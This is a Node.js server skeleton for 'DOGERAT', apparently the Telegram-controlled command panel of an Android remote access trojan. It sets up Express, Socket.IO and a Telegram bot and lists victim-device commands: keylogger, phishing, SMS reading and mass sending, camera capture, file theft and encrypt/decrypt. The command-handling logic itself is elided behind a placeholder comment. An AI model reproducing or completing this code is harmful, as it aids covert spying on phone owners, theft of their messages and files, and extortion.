const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new TelegramBot(data.token, { polling: true, request: {} });

const appData = new Map();
const actions = [
  '✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT',
  '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯',
  '✯ 𝙲𝚊𝚕𝚕𝚜 ✯',
  '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯',
  '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯',
  '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯',
  '✯ 𝚂𝚖𝚜 ✯',
  '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯',
  '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯',
  '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯',
  '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯',
  '✯ 𝙰𝚞𝚍𝚒𝚘 ✯',
  '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯',
  '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯',
  '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯',
  '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯',
  '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯',
  '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯',
  '✯ 𝚃𝚘𝚊𝚜𝚝 ✯',
  '✯ 𝙵𝚒𝚕𝚎 ✯',
  '✯ 𝙰𝚙𝚙𝚜 ✯',
  '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯',
  '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯',
  '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯',
  '✯ 𝚂𝚎𝚗𝚍 𝙵𝚒𝚕𝚎 ✯'
];

// Your route and socket.io logic here

server.listen(process.env.PORT || 3000, () => {
  console.log(`Server is running on port ${process.env.PORT || 3000}`);
});
